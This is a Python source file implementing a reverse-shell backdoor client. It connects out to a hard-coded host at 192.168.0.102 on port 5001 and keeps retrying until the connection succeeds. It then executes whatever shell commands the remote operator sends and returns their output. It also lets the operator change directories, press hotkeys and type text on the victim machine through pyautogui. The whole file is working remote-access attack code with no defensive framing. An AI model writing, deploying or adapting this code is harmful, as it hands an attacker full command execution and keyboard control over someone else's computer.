import socket
import subprocess
import os
import time
import pyautogui

# Connect to server
def create_socket():
    try:
        global c
        c = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        host = "192.168.0.102"      
        c.connect((host,5001))
    except:
        print("retry in 10 secs")
        time.sleep(10)
        create_socket()

# recieves/sends commands from/to server.
def reciever():
    c.send(str.encode(os.getcwd()+'>'))
    while True:
        data = c.recv(2048)
        if data[:2].decode('utf-8') == 'cd':
            try:
                os.chdir(data[3:].decode('utf-8'))
                c.send(str.encode(os.getcwd()+'>'))
            except Exception as e:
                c.send(str.encode("system cannot find specified path.\n"))

        elif len(data)>0:                                                    
            # press hotkeys e.g. ctrl+v, ctrl+shift+esc
            if data[:3].decode('utf-8') == 'hot':
                hotkeys = data.decode('utf-8').split(" ")
                if(len(hotkeys)==3):
                    pyautogui.hotkey(hotkeys[1],hotkeys[2])
                else:
                    pyautogui.hotkey(hotkeys[1],hotkeys[2],hotkeys[3])

            # press any keys e.g. enter,tab
            elif data[:5].decode('utf-8') == 'press':
                time.sleep(3)
                key = data.decode('utf-8').split(" ")
                pyautogui.press(key[1])
                output_str = "Done\n"
                currentWD = os.getcwd()+'>'
                c.send(str.encode(output_str+currentWD))

            # type something
            elif data[:4].decode('utf-8')=='type':
                time.sleep(3)
                text = data.decode('utf-8').split("~")
                pyautogui.write(text[1],interval=0.10)
                output_str = "Done\n"
                currentWD = os.getcwd()+'>'
                c.send(str.encode(output_str+currentWD))           
            else:
                # i.e, he wants cmd
                cmd = subprocess.Popen(data[:].decode('utf-8'), shell=True, stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
                output_byte = cmd.stdout.read()+cmd.stderr.read()
                output_str = str(output_byte,'utf-8')
                currentWD = os.getcwd()+'>'
                c.send(str.encode(output_str+currentWD))

if __name__ == "__main__":
    create_socket()
    reciever()        


